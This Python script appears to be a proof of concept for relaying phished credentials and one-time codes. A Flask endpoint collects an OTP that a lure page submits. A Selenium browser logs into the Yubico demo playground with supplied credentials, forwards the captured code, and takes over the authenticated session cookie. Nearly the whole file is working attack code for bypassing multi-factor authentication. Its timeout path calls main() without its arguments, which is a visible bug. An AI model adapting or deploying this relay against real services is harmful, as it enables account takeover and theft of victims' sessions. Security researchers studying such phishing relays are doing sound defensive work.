import os, time, json, base64, threading, sys
from dataclasses import dataclass, field
from typing import List, Optional
from fido2.utils import _CamelCaseDataObject
from fido2 import cbor
from fido2.server import Fido2Server, PublicKeyCredentialRequestOptions, PublicKeyCredentialDescriptor
from fido2.webauthn import PublicKeyCredentialRpEntity
from flask import Flask, abort, jsonify, render_template, request, session, redirect
from selenium import webdriver
from seleniumrequests import Firefox
from seleniumrequests.request import RequestsSessionMixin
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

app = Flask(__name__)
app.secret_key = os.urandom(32)
_rp = PublicKeyCredentialRpEntity(name="Demo app")
_server = Fido2Server(_rp)
browser_options = webdriver.FirefoxOptions()
useragent = "Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
browser_options.set_preference("general.useragent.override", useragent)
browser_options.set_preference("dom.webnotifications.serviceworker.enabled", False)
browser_options.set_preference("dom.webnotifications.enabled", False)
global otp_code
otp_code = None

class MyCustomWebDriver(Firefox,RequestsSessionMixin):
    pass
browser = MyCustomWebDriver(options=browser_options)

@dataclass(eq=False, frozen=True)
class CredentialRequestOptions(_CamelCaseDataObject):
    public_key: PublicKeyCredentialRequestOptions

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/authenticate", methods=["POST"])
def authenticate():
    data = request.json or {}
    global otp_code
    if "otp_code" in data.keys():
        otp_code = data["otp_code"]
    else:
        otp_code = None

    return {"status": "OK"}

def main(username, password):
    browser.get('https://demo.yubico.com/playground')
    time.sleep(2)

    #login with username and password
    creds = {
        "username":username,
        "password":password,
        "namespace":"playground"
    }
    response = browser.request('POST', 'https://demo.yubico.com/api/v1/auth/login', json=creds)
    auth_resp = response.json()
    uuid = auth_resp['data']['user']['uuid']
    auth_cookie = response.cookies.get('demo_website_session')
    browser.add_cookie({"name":"demo_website_session", "value": auth_cookie})

    #continue with OTP auth
    #get data from yubikey, reauth if timeout reached  
    print("[*] Waiting for OTP..")
    timeout = 90000
    c = 0
    global otp_code
    while otp_code == None:
        time.sleep(0.5)
        c += 500
        if c > timeout:
            main()

    final_data = {
        "code": otp_code,
        "uuid": uuid
    }

    #send yubikey data
    response = browser.request('POST', 'https://demo.yubico.com/api/v1/auth/totp', json=final_data)
    final_resp = response.json()
    if final_resp['status'] == 'success':
        print("[+] Success!")
        auth_cookie = response.cookies.get('demo_website_session')
        browser.delete_cookie("demo_website_session")
        browser.add_cookie({"name":"demo_website_session", "value": auth_cookie})

        browser.get('https://demo.yubico.com/playground')

        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                break
    else:
        print(final_resp)
    
    browser.quit()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("{0} <username> <password>".format(sys.argv[0]))
        sys.exit()
    #start fido server in background
    #thread = threading.Thread(target=lambda: app.run(port=443, ssl_context=('yubico.pem', 'yubico-key.pem'), debug=False, use_reloader=False))
    thread = threading.Thread(target=lambda: app.run(port=80, debug=False, use_reloader=False))
    thread.daemon = True
    thread.start()
    try:
        main(sys.argv[1], sys.argv[2])
    except (KeyboardInterrupt, SystemExit):
        sys.exit()
